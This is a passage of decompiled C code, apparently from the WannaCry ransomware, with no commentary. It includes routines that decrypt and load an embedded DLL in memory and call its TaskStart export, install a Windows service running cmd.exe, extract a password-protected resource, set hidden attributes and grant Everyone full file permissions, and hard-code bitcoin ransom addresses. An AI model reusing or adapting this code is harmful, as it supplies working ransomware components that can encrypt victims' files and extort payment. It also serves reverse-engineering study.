  local_248 = 0;
  local_240 = 0;
  local_23f = 0;
  uStack571 = 0;
  uStack569 = 0;
  local_244 = 0;
  local_20[0] = 0;
  local_8 = 0;
  hFile = CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    GetFileSizeEx(hFile,(PLARGE_INTEGER)&local_28);
    if ((local_24 < 1) && ((local_24 < 0 || (local_28 < 0x6400001)))) {
      iVar2 = (*DAT_0040f880)(hFile,&local_240,8,local_20,0);
      if (iVar2 != 0) {
        iVar2 = memcmp(&local_240,s_WANACRY__0040eb7c,8);
        if (iVar2 == 0) {
          iVar2 = (*DAT_0040f880)(hFile,&local_248,4,local_20,0);
          if ((iVar2 != 0) && (local_248 == 0x100)) {
            iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)(param_1_00 + 0x4c8),0x100,local_20,0);
            if (iVar2 != 0) {
              iVar2 = (*DAT_0040f880)(hFile,&local_244,4,local_20,0);
              if (iVar2 != 0) {
                iVar2 = (*DAT_0040f880)(hFile,&local_238,8,local_20,0);
                if (((iVar2 != 0) && ((int)local_234 < 1)) &&
                   (((int)local_234 < 0 || (local_238 < 0x6400001)))) {
                  iVar2 = FUN_004019e1(*(undefined4 *)(param_1_00 + 0x4c8),local_248,local_230,
                                       &local_30);
                  if (iVar2 != 0) {
                    FUN_00402a76(local_230,PTR_DAT_0040f578,local_30,0x10);
                    local_2c = GlobalAlloc(0,local_238);
                    if (local_2c != (HGLOBAL)0x0) {
                      iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)(param_1_00 + 0x4c8),local_28,
                                              local_20,0);
                      pvVar1 = local_2c;
                      if (((iVar2 != 0) && (local_20[0] != 0)) &&
                         ((0x7fffffff < local_234 ||
                          (((int)local_234 < 1 && (local_238 <= local_20[0])))))) {
                        FUN_00403a77(*(undefined4 *)(param_1_00 + 0x4c8),local_2c,local_20[0],1);
                        *param_2 = local_238;
                        pvVar3 = pvVar1;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  _local_unwind2(&local_14,0xffffffff);
  *in_FS_OFFSET = local_14;
  return pvVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040170a(void)

{
  int iVar1;
  HMODULE hModule;
  
  iVar1 = FUN_00401a45();
  if (iVar1 != 0) {
    if (_DAT_0040f878 != (FARPROC)0x0) {
      return 1;
    }
    hModule = LoadLibraryA(s_kernel32_dll_0040ebe8);
    if (hModule != (HMODULE)0x0) {
      _DAT_0040f878 = GetProcAddress(hModule,s_CreateFileW_0040ebdc);
      _DAT_0040f87c = GetProcAddress(hModule,s_WriteFile_0040ebd0);
      DAT_0040f880 = GetProcAddress(hModule,s_ReadFile_0040ebc4);
      _DAT_0040f884 = GetProcAddress(hModule,s_MoveFileW_0040ebb8);
      _DAT_0040f888 = GetProcAddress(hModule,s_MoveFileExW_0040ebac);
      _DAT_0040f88c = GetProcAddress(hModule,s_DeleteFileW_0040eba0);
      _DAT_0040f890 = GetProcAddress(hModule,s_CloseHandle_0040eb94);
      if ((((_DAT_0040f878 != (FARPROC)0x0) && (_DAT_0040f87c != (FARPROC)0x0)) &&
          (DAT_0040f880 != (FARPROC)0x0)) &&
         (((_DAT_0040f884 != (FARPROC)0x0 && (_DAT_0040f888 != (FARPROC)0x0)) &&
          ((_DAT_0040f88c != (FARPROC)0x0 && (_DAT_0040f890 != (FARPROC)0x0)))))) {
        return 1;
      }
    }
  }
  return 0;
}



undefined4 * __fastcall FUN_004017dd(undefined4 *param_1)

{
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  *param_1 = &PTR_FUN_004081ec;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return param_1;
}



void * __thiscall FUN_004017ff(void *param_1_00,byte param_1)

{
  FUN_0040181b();
  if ((param_1 & 1) != 0) {
    operator_delete(param_1_00);
  }
  return param_1_00;
}



void __fastcall FUN_0040181b(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_004081ec;
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return;
}



undefined4 __fastcall FUN_0040182c(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  do {
    iVar1 = (*DAT_0040f894)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x40f08c,0x18,0xf0000000);
    if (iVar1 != 0) {
      return 1;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 2);
  return 0;
}



undefined4 __thiscall FUN_00401861(int param_1_00,int param_1)

{
  int iVar1;
  
  iVar1 = FUN_0040182c();
  if (iVar1 != 0) {
    if (param_1 == 0) {
      iVar1 = (*DAT_0040f898)(*(undefined4 *)(param_1_00 + 4),&DAT_0040ebf8,0x494,0,0,param_1_00 + 8
                             );
    }
    else {
      iVar1 = FUN_004018f9(*(undefined4 *)(param_1_00 + 4),param_1_00 + 8,param_1);
    }
    if (iVar1 != 0) {
      return 1;
    }
  }
  FUN_004018b9();
  return 0;
}



undefined4 __fastcall FUN_004018b9(int param_1)

{
  if (*(int *)(param_1 + 8) != 0) {
    (*DAT_0040f89c)(*(int *)(param_1 + 8));
    *(undefined4 *)(param_1 + 8) = 0;
  }
  if (*(int *)(param_1 + 0xc) != 0) {
    (*DAT_0040f89c)(*(int *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
    CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
    *(undefined4 *)(param_1 + 4) = 0;
  }
  return 1;
}



undefined4 FUN_004018f9(undefined4 param_1,undefined4 param_2,LPCSTR param_3)

{
  HANDLE hFile;
  DWORD dwBytes;
  HGLOBAL lpBuffer;
  BOOL BVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 *in_FS_OFFSET;
  DWORD local_20 [3];
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_004081f0;
  puStack16 = &DAT_004076f4;
  local_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_14;
  uVar3 = 0;
  local_20[0] = 0;
  local_8 = 0;
  hFile = CreateFileA(param_3,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    dwBytes = GetFileSize(hFile,(LPDWORD)0x0);
    if ((dwBytes != 0xffffffff) && (dwBytes < 0x19001)) {
      lpBuffer = GlobalAlloc(0,dwBytes);
      if (lpBuffer != (HGLOBAL)0x0) {
        BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,(LPOVERLAPPED)0x0);
        if (BVar1 != 0) {
          iVar2 = (*DAT_0040f898)(param_1,lpBuffer,local_20[0],0,0,param_2);
          if (iVar2 != 0) {
            uVar3 = 1;
          }
        }
      }
    }
  }
  _local_unwind2(&local_14,0xffffffff);
  *in_FS_OFFSET = local_14;
  return uVar3;
}



undefined4 __thiscall
FUN_004019e1(int param_1_00,void *param_1,size_t param_2,void *param_3,size_t *param_4)

{
  LPCRITICAL_SECTION lpCriticalSection;
  int iVar1;
  
  if (*(int *)(param_1_00 + 8) != 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)(param_1_00 + 0x10);
    EnterCriticalSection(lpCriticalSection);
    iVar1 = (*DAT_0040f8a4)(*(undefined4 *)(param_1_00 + 8),0,1,0,param_1,&param_2);
    if (iVar1 != 0) {
      LeaveCriticalSection(lpCriticalSection);
      memcpy(param_3,param_1,param_2);
      *param_4 = param_2;
      return 1;
    }
    LeaveCriticalSection(lpCriticalSection);
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00401a45(void)

{
  HMODULE hModule;
  undefined4 uVar1;
  
  if (DAT_0040f894 == (FARPROC)0x0) {
    hModule = LoadLibraryA(s_advapi32_dll_0040e020);
    if (hModule != (HMODULE)0x0) {
      DAT_0040f894 = GetProcAddress(hModule,s_CryptAcquireContextA_0040f110);
      DAT_0040f898 = GetProcAddress(hModule,s_CryptImportKey_0040f100);
      DAT_0040f89c = GetProcAddress(hModule,s_CryptDestroyKey_0040f0f0);
      _DAT_0040f8a0 = GetProcAddress(hModule,s_CryptEncrypt_0040f0e0);
      DAT_0040f8a4 = GetProcAddress(hModule,s_CryptDecrypt_0040f0d0);
      _DAT_0040f8a8 = GetProcAddress(hModule,s_CryptGenKey_0040f0c4);
      if ((((DAT_0040f894 != (FARPROC)0x0) && (DAT_0040f898 != (FARPROC)0x0)) &&
          (DAT_0040f89c != (FARPROC)0x0)) &&
         (((_DAT_0040f8a0 != (FARPROC)0x0 && (DAT_0040f8a4 != (FARPROC)0x0)) &&
          (_DAT_0040f8a8 != (FARPROC)0x0)))) goto LAB_00401aec;
    }
    uVar1 = 0;
  }
  else {
LAB_00401aec:
    uVar1 = 1;
  }
  return uVar1;
}



undefined4 FUN_00401af6(LPCWSTR param_1,LPCWSTR param_2,wchar_t *param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  
  CreateDirectoryW(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  BVar1 = SetCurrentDirectoryW(param_1);
  if (BVar1 != 0) {
    CreateDirectoryW(param_2,(LPSECURITY_ATTRIBUTES)0x0);
    BVar1 = SetCurrentDirectoryW(param_2);
    if (BVar1 != 0) {
      DVar2 = GetFileAttributesW(param_2);
      SetFileAttributesW(param_2,DVar2 | 6);
      if (param_3 != (wchar_t *)0x0) {
        swprintf(param_3,(size_t)u__s__s_0040eb88,param_1);
      }
      return 1;
    }
  }
  return 0;
}



bool FUN_00401b5f(void)

{
  DWORD DVar1;
  wchar_t *pwVar2;
  int iVar3;
  undefined4 *puVar4;
  WCHAR local_2d4;
  undefined4 local_2d2 [129];
  WCHAR local_cc;
  undefined4 local_ca [49];
  
  puVar4 = (undefined4 *)&stack0xfffffb26;
  for (iVar3 = 0x81; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  local_2d4 = DAT_0040f874;
  puVar4 = local_2d2;
  for (iVar3 = 0x81; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  local_cc = DAT_0040f874;
  puVar4 = local_ca;
  for (iVar3 = 0x31; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  MultiByteToWideChar(0,0,&DAT_0040f8ac,-1,&local_cc,99);
  GetWindowsDirectoryW((LPWSTR)&stack0xfffffb24,0x104);
  swprintf(&local_2d4,(size_t)&PTR_Rsrc_XIA_80a_409_3276597__0040f40c,(wchar_t *)&stack0xfffffb24);
  DVar1 = GetFileAttributesW(&local_2d4);
  if ((DVar1 == 0xffffffff) || (iVar3 = FUN_00401af6(&local_2d4,&local_cc), iVar3 == 0)) {
    swprintf(&local_2d4,(size_t)&PTR_Rsrc_XIA_80a_409_3276597__0040f3f8,(wchar_t *)&stack0xfffffb24)
    ;
    iVar3 = FUN_00401af6(&local_2d4,&local_cc);
    if ((iVar3 == 0) && (iVar3 = FUN_00401af6(), iVar3 == 0)) {
      GetTempPathW(0x104,&local_2d4);
      pwVar2 = wcsrchr(&local_2d4,L'\\');
      if (pwVar2 != (wchar_t *)0x0) {
        pwVar2 = wcsrchr(&local_2d4,L'\\');
        *pwVar2 = L'\0';
      }
      iVar3 = FUN_00401af6();
      return iVar3 != 0;
    }
  }
  return true;
}



undefined4 FUN_00401ce8(undefined4 param_1)

{
  undefined4 uVar1;
  SC_HANDLE hService;
  char local_410 [1024];
  SC_HANDLE local_10;
  undefined4 local_c;
  SC_HANDLE local_8;
  
  local_c = 0;
  local_8 = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (local_8 == (SC_HANDLE)0x0) {
    uVar1 = 0;
  }
  else {
    local_10 = OpenServiceA(local_8,&DAT_0040f8ac,0xf01ff);
    if (local_10 == (SC_HANDLE)0x0) {
      sprintf(local_410,s_cmd_exe__c___s__0040f42c,param_1);
      hService = CreateServiceA(local_8,&DAT_0040f8ac,&DAT_0040f8ac,0xf01ff,0x10,2,1,local_410,
                                (LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,(LPCSTR)0x0);
      uVar1 = local_c;
      if (hService != (SC_HANDLE)0x0) {
        StartServiceA(hService,0,(LPCSTR *)0x0);
        CloseServiceHandle(hService);
        local_c = 1;
        uVar1 = local_c;
      }
    }
    else {
      StartServiceA(local_10,0,(LPCSTR *)0x0);
      CloseServiceHandle(local_10);
      uVar1 = 1;
    }
    CloseServiceHandle(local_8);
  }
  return uVar1;
}



undefined4 FUN_00401dab(HMODULE param_1,undefined4 param_2)

{
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID pvVar1;
  DWORD DVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  undefined4 *puVar6;
  int iVar7;
  int local_130;
  undefined4 local_12c [74];
  
  hResInfo = FindResourceA(param_1,(LPCSTR)0x80a,&DAT_0040f43c);
  if (((hResInfo != (HRSRC)0x0) &&
      (hResData = LoadResource(param_1,hResInfo), hResData != (HGLOBAL)0x0)) &&
     (pvVar1 = LockResource(hResData), pvVar1 != (LPVOID)0x0)) {
    DVar2 = SizeofResource(param_1,hResInfo);
    iVar3 = FUN_004075ad(pvVar1,DVar2,param_2);
    if (iVar3 != 0) {
      local_130 = 0;
      puVar6 = local_12c;
      for (iVar5 = 0x4a; iVar5 != 0; iVar5 = iVar5 + -1) {
        *puVar6 = 0;
        puVar6 = puVar6 + 1;
      }
      FUN_004075c4(iVar3,0xffffffff,&local_130);
      iVar5 = local_130;
      iVar7 = 0;
      if (0 < local_130) {
        do {
          FUN_004075c4(iVar3,iVar7,&local_130);
          iVar4 = strcmp((char *)local_12c,s_c_wnry_0040e010);
          if ((iVar4 != 0) || (DVar2 = GetFileAttributesA((LPCSTR)local_12c), DVar2 == 0xffffffff))
          {
            FUN_0040763d(iVar3,iVar7,local_12c);
          }
          iVar7 = iVar7 + 1;
        } while (iVar7 < iVar5);
      }
      FUN_00407656(iVar3);
      return 1;
    }
  }
  return 0;
}



void FUN_00401e9e(void)

{
  int iVar1;
  undefined local_31c [178];
  char local_26a [602];
  char *local_10 [3];
  
  local_10[0] = s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488;
  local_10[1] = s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
  local_10[2] = s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
  iVar1 = FUN_00401000(local_31c,1);
  if (iVar1 != 0) {
    iVar1 = rand();
    strcpy(local_26a,local_10[iVar1 % 3]);
    FUN_00401000(local_31c,0);
  }
  return;
}



undefined4 FUN_00401eff(int param_1)

{
  HANDLE hObject;
  int iVar1;
  char local_68 [100];
  
  sprintf(local_68,&DAT_0040f4ac,s_Global_MsWinZonesCacheCounterMut_0040f4b4,0);
  iVar1 = 0;
  if (0 < param_1) {
    do {
      hObject = OpenMutexA(0x100000,1,local_68);
      if (hObject != (HANDLE)0x0) {
        CloseHandle(hObject);
        return 1;
      }
      Sleep(1000);
      iVar1 = iVar1 + 1;
    } while (iVar1 < param_1);
  }
  return 0;
}



undefined4 FUN_00401f5d(void)

{
  int iVar1;
  undefined4 *puVar2;
  CHAR local_20c;
  undefined4 local_20b;
  
  local_20c = DAT_0040f910;
  puVar2 = &local_20b;
  for (iVar1 = 0x81; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  GetFullPathNameA(s_tasksche_exe_0040f4d8,0x208,&local_20c,(LPSTR *)0x0);
  iVar1 = FUN_00401ce8(&local_20c);
  if ((iVar1 != 0) && (iVar1 = FUN_00401eff(0x3c), iVar1 != 0)) {
    return 1;
  }
  iVar1 = FUN_00401064(&local_20c,0,0);
  if ((iVar1 != 0) && (iVar1 = FUN_00401eff(0x3c), iVar1 != 0)) {
    return 1;
  }
  return 0;
}



undefined4 FUN_00401fe7(void)

{
  int *piVar1;
  DWORD DVar2;
  code *pcVar3;
  int iVar4;
  undefined4 *puVar5;
  char *pcVar6;
  CHAR local_210;
  undefined4 local_20f;
  undefined4 local_8;
  
  local_210 = DAT_0040f910;
  puVar5 = &local_20f;
  for (iVar4 = 0x81; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  GetModuleFileNameA((HMODULE)0x0,&local_210,0x208);
  FUN_00401225(&DAT_0040f8ac);
  piVar1 = (int *)__p___argc();
  if (*piVar1 == 2) {
    pcVar6 = &DAT_0040f538;
    piVar1 = (int *)__p___argv();
    iVar4 = strcmp(*(char **)(*piVar1 + 4),pcVar6);
    if ((iVar4 == 0) && (iVar4 = FUN_00401b5f(0), iVar4 != 0)) {
      CopyFileA(&local_210,s_tasksche_exe_0040f4d8,0);
      DVar2 = GetFileAttributesA(s_tasksche_exe_0040f4d8);
      if ((DVar2 != 0xffffffff) && (iVar4 = FUN_00401f5d(), iVar4 != 0)) {
        return 0;
      }
    }
  }
  pcVar6 = strrchr(&local_210,0x5c);
  if (pcVar6 != (char *)0x0) {
    pcVar6 = strrchr(&local_210,0x5c);
    *pcVar6 = '\0';
  }
  SetCurrentDirectoryA(&local_210);
  FUN_004010fd(1);
  FUN_00401dab(0,s_WNcry_2ol7_0040f52c);
  FUN_00401e9e();
  FUN_00401064(s_attrib__h___0040f520,0,0);
  FUN_00401064(s_icacls____grant_Everyone_F__T__C_0040f4fc,0,0);
  iVar4 = FUN_0040170a();
  if (iVar4 != 0) {
    FUN_004012fd();
    iVar4 = FUN_00401437(0,0,0);
    if (iVar4 != 0) {
      local_8 = 0;
      iVar4 = FUN_004014a6(s_t_wnry_0040f4f4,&local_8);
      if (((iVar4 != 0) && (iVar4 = FUN_004021bd(iVar4,local_8), iVar4 != 0)) &&
         (pcVar3 = (code *)FUN_00402924(iVar4,s_TaskStart_0040f4e8), pcVar3 != (code *)0x0)) {
        (*pcVar3)(0,0);
      }
    }
    FUN_0040137a();
  }
  return 0;
}



void FUN_004021bd(undefined4 param_1,undefined4 param_2)

{
  FUN_004021e9(param_1,param_2,&LAB_0040216e,&LAB_00402185,&LAB_00402198,&LAB_004021a3,&LAB_004021b2
               ,0);
  return;
}



int * FUN_004021e9(short *param_1,undefined4 param_2,code *param_3,code *param_4,int param_5,
                  code *param_6,int param_7,int param_8)

{
  uint uVar1;
  int iVar2;
  HMODULE pHVar3;
  code *pcVar4;
  HANDLE hHeap;
  int *piVar5;
  int iVar6;
  void *_Dst;
  uint uVar7;
  int *piVar8;
  DWORD DVar9;
  SIZE_T dwBytes;
  undefined local_2c [4];
  int local_28;
  uint local_8;
  
  local_8 = 0;
  iVar2 = FUN_00402457(param_2,0x40);
  if (iVar2 == 0) {
    return (int *)0x0;
  }
  if (*param_1 == 0x5a4d) {
    iVar2 = FUN_00402457(param_2,*(int *)(param_1 + 0x1e) + 0xf8);
    if (iVar2 == 0) {
      return (int *)0x0;
    }
    piVar8 = (int *)(*(int *)(param_1 + 0x1e) + (int)param_1);
    if (((*piVar8 == 0x4550) && (*(short *)(piVar8 + 1) == 0x14c)) && ((piVar8[0xe] & 1U) == 0)) {
      uVar7 = (uint)*(ushort *)((int)piVar8 + 6);
      if (uVar7 != 0) {
        piVar5 = (int *)((int)piVar8 + *(ushort *)(piVar8 + 5) + 0x24);
        do {
          uVar1 = piVar5[1];
          if (uVar1 == 0) {
            uVar1 = piVar8[0xe];
          }
          if (local_8 < *piVar5 + uVar1) {
            local_8 = *piVar5 + uVar1;
          }
          piVar5 = piVar5 + 10;
          uVar7 = uVar7 - 1;
        } while (uVar7 != 0);
      }
      pHVar3 = GetModuleHandleA(s_kernel32_dll_0040ebe8);
      if (pHVar3 == (HMODULE)0x0) {
        return (int *)0x0;
      }
      pcVar4 = (code *)(*param_6)(pHVar3,s_GetNativeSystemInfo_0040f55c,0);
      if (pcVar4 == (code *)0x0) {
        return (int *)0x0;
      }
      (*pcVar4)(local_2c);
      uVar7 = piVar8[0x14] + -1 + local_28 & ~(local_28 - 1U);
      if (uVar7 == (local_28 + -1 + local_8 & ~(local_28 - 1U))) {
        iVar2 = (*param_3)(piVar8[0xd],uVar7,0x3000,4,param_8);
        if ((iVar2 != 0) || (iVar2 = (*param_3)(0,uVar7,0x3000,4,param_8), iVar2 != 0)) {
          dwBytes = 0x3c;
          DVar9 = 8;
          hHeap = GetProcessHeap();
          piVar5 = (int *)HeapAlloc(hHeap,DVar9,dwBytes);
          if (piVar5 != (int *)0x0) {
            piVar5[1] = iVar2;
            piVar5[5] = *(ushort *)((int)piVar8 + 0x16) >> 0xd & 1;
            piVar5[7] = (int)param_3;
            piVar5[8] = (int)param_4;
            piVar5[9] = param_5;
            piVar5[10] = (int)param_6;
            piVar5[0xb] = param_7;
            piVar5[0xc] = param_8;
            piVar5[0xe] = local_28;
            iVar6 = FUN_00402457(param_2,piVar8[0x15]);
            if (iVar6 != 0) {
              _Dst = (void *)(*param_3)(iVar2,piVar8[0x15],0x1000,4,param_8);
              memcpy(_Dst,param_1,piVar8[0x15]);
              iVar6 = *(int *)(param_1 + 0x1e);
              *piVar5 = iVar6 + (int)_Dst;
              *(int *)(iVar6 + (int)_Dst + 0x34) = iVar2;
              iVar6 = FUN_00402470(param_1,param_2,piVar8,piVar5);
              if (iVar6 != 0) {
                iVar6 = *(int *)(*piVar5 + 0x34) - piVar8[0xd];
                if (iVar6 == 0) {
                  piVar5[6] = 1;
                }
                else {
                  iVar6 = FUN_00402758(piVar5,iVar6);
                  piVar5[6] = iVar6;
                }
                iVar6 = FUN_004027df(piVar5);
                if (((iVar6 != 0) && (iVar6 = FUN_0040254b(piVar5), iVar6 != 0)) &&
                   (iVar6 = FUN_0040271d(piVar5), iVar6 != 0)) {
                  iVar6 = *(int *)(*piVar5 + 0x28);
                  if (iVar6 == 0) {
                    piVar5[0xd] = 0;
                    return piVar5;
                  }
                  if (piVar5[5] == 0) {
                    piVar5[0xd] = iVar6 + iVar2;
                    return piVar5;
                  }
                  iVar2 = (*(code *)(iVar6 + iVar2))(iVar2,1,0);
                  if (iVar2 != 0) {
                    piVar5[4] = 1;
                    return piVar5;
                  }
                  SetLastError(0x45a);
                }
              }
            }
            FUN_004029cc(piVar5);
            return (int *)0x0;
          }
          (*param_4)(iVar2,0,0x8000,param_8);
        }
        DVar9 = 0xe;
        goto LAB_00402219;
      }
    }
  }
  DVar9 = 0xc1;
LAB_00402219:
  SetLastError(DVar9);
  return (int *)0x0;
}



undefined4 FUN_00402457(uint param_1,uint param_2)

{
  if (param_1 < param_2) {
    SetLastError(0xd);
    return 0;
  }
  return 1;
}



undefined4 FUN_00402470(int param_1,undefined4 param_2,int param_3,int *param_4)

{
  size_t *psVar1;
  int iVar2;
  size_t sVar3;
  int iVar4;
  size_t *psVar5;
  int local_8;
  
  local_8 = 0;
  iVar2 = param_4[1];
  iVar4 = *param_4;
  psVar1 = (size_t *)((uint)*(ushort *)(iVar4 + 0x14) + iVar4);
  if (*(short *)(iVar4 + 6) != 0) {
    do {
      psVar5 = psVar1 + 10;
      if (*psVar5 == 0) {
        sVar3 = *(size_t *)(param_3 + 0x38);
        if (0 < (int)sVar3) {
          iVar4 = (*(code *)param_4[7])(iVar2 + psVar1[9],sVar3,0x1000,4,param_4[0xc]);
          if (iVar4 == 0) {
            return 0;
          }
          psVar1[8] = (size_t)(void *)(iVar2 + psVar1[9]);
          memset((void *)(iVar2 + psVar1[9]),0,sVar3);
        }
      }
      else {
        iVar4 = FUN_00402457(param_2,psVar1[0xb] + *psVar5);
        if ((iVar4 == 0) ||
           (iVar4 = (*(code *)param_4[7])(iVar2 + psVar1[9],*psVar5,0x1000,4,param_4[0xc]),
           iVar4 == 0)) {
          return 0;
        }
        sVar3 = psVar1[9];
        memcpy((void *)(iVar2 + sVar3),(void *)(psVar1[0xb] + param_1),*psVar5);
        psVar1[8] = (size_t)(void *)(iVar2 + sVar3);
      }
      local_8 = local_8 + 1;
      psVar1 = psVar5;
    } while (local_8 < (int)(uint)*(ushort *)(*param_4 + 6));
  }
  return 1;
}



bool FUN_0040254b(int *param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  uint local_20;
  uint local_1c;
  int local_18;
  uint local_14;
  undefined4 local_10;
  int local_c;
  uint local_8;
  
  piVar1 = param_1;
  iVar3 = *(ushort *)(*param_1 + 0x14) + 0x18 + *param_1;
  local_20 = *(uint *)(iVar3 + 8);
  local_1c = ~(param_1[0xe] - 1U) & local_20;
  local_18 = FUN_0040264f(param_1,iVar3);
  local_14 = *(uint *)(iVar3 + 0x24);
  local_10 = 0;
  iVar2 = *param_1;
  param_1 = (int *)0x1;
  if (1 < *(ushort *)(iVar2 + 6)) {
    do {
      local_8 = *(uint *)(iVar3 + 0x30);
      uVar4 = ~(piVar1[0xe] - 1U) & local_8;
      local_c = FUN_0040264f(piVar1,iVar3 + 0x28);
      if ((local_1c == uVar4) || (uVar4 < local_18 + local_20)) {
        uVar4 = *(uint *)(iVar3 + 0x4c);
        if (((uVar4 & 0x2000000) == 0) || ((local_14 & 0x2000000) == 0)) {
          local_14 = (uVar4 | local_14) & 0xfdffffff;
        }
        else {
          local_14 = local_14 | uVar4;
        }
        local_18 = (local_c - local_20) + local_8;
      }
      else {
        iVar2 = FUN_0040267b(piVar1,&local_20);
        if (iVar2 == 0) {
          return false;
        }
        local_20 = local_8;
        local_18 = local_c;
        local_14 = *(uint *)(iVar3 + 0x4c);
        local_1c = uVar4;
      }
      param_1 = (int *)((int)param_1 + 1);
      iVar3 = iVar3 + 0x28;
    } while ((int)param_1 < (int)(uint)*(ushort *)(*piVar1 + 6));
  }
  local_10 = 1;
  iVar3 = FUN_0040267b(piVar1,&local_20);
  return iVar3 != 0;
}



int FUN_0040264f(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = *(int *)(param_2 + 0x10);
  if (iVar1 == 0) {
    if ((*(uint *)(param_2 + 0x24) & 0x40) != 0) {
      return *(int *)(*param_1 + 0x20);
    }
    if ((*(uint *)(param_2 + 0x24) & 0x80) != 0) {
      iVar1 = *(int *)(*param_1 + 0x24);
    }
  }
  return iVar1;
}



bool FUN_0040267b(int *param_1,LPVOID *param_2)

{
  LPVOID dwSize;
  LPVOID pvVar1;
  BOOL BVar2;
  uint flNewProtect;
  bool bVar3;
  
  dwSize = param_2[2];
  if (dwSize == (LPVOID)0x0) {
    bVar3 = true;
  }
  else {
    pvVar1 = param_2[3];
    if (((uint)pvVar1 & 0x2000000) == 0) {
      flNewProtect = *(uint *)(&DAT_0040f53c +
                              ((((uint)pvVar1 >> 0x1e & 1) + ((uint)pvVar1 >> 0x1d & 1) * 2) * 2 -
                              ((int)pvVar1 >> 0x1f)) * 4);
      if (((uint)pvVar1 & 0x4000000) != 0) {
        flNewProtect = flNewProtect | 0x200;
      }
      BVar2 = VirtualProtect(*param_2,(SIZE_T)dwSize,flNewProtect,(PDWORD)&param_2);
      bVar3 = BVar2 != 0;
    }
    else {
      if ((*param_2 == param_2[1]) &&
         (((param_2[4] != (LPVOID)0x0 || (*(uint *)(*param_1 + 0x38) == param_1[0xe])) ||
          ((uint)dwSize % (uint)param_1[0xe] == 0)))) {
        (*(code *)param_1[8])(*param_2,dwSize,0x4000,param_1[0xc]);
      }
      bVar3 = true;
    }
  }
  return bVar3;
}



undefined4 FUN_0040271d(int *param_1)

{
  int iVar1;
  code **ppcVar2;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xc0) == 0) {
    return 1;
  }
  ppcVar2 = *(code ***)(*(int *)(*param_1 + 0xc0) + 0xc + iVar1);
  if (ppcVar2 != (code **)0x0) {
    for (; *ppcVar2 != (code *)0x0; ppcVar2 = ppcVar2 + 1) {
      (**ppcVar2)(iVar1,1,0);
    }
  }
  return 1;
}



bool FUN_00402758(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  bool bVar6;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xa4) == 0) {
    bVar6 = param_2 == 0;
  }
  else {
    piVar3 = (int *)(*(int *)(*param_1 + 0xa0) + iVar1);
    iVar2 = *piVar3;
    while (iVar2 != 0) {
      param_1 = (int *)0x0;
      piVar5 = piVar3 + 2;
      if ((piVar3[1] - 8U & 0xfffffffe) != 0) {
        do {
          if ((*(ushort *)piVar5 & 0xf000) == 0x3000) {
            piVar4 = (int *)((*(ushort *)piVar5 & 0xfff) + iVar2 + iVar1);
            *piVar4 = *piVar4 + param_2;
          }
          param_1 = (int *)((int)param_1 + 1);
          piVar5 = (int *)((int)piVar5 + 2);
        } while (param_1 < piVar3[1] - 8U >> 1);
      }
      piVar3 = (int *)((int)piVar3 + piVar3[1]);
      iVar2 = *piVar3;
    }
    bVar6 = true;
  }
  return bVar6;
}



int FUN_004027df(uint *param_1)

{
  int iVar1;
  int *piVar2;
  void *pvVar3;
  uint uVar4;
  int iVar5;
  int *lp;
  uint *puVar6;
  int iVar7;
  DWORD dwErrCode;
  int local_c;
  
  piVar2 = (int *)param_1;
  iVar1 = param_1[1];
  iVar5 = 1;
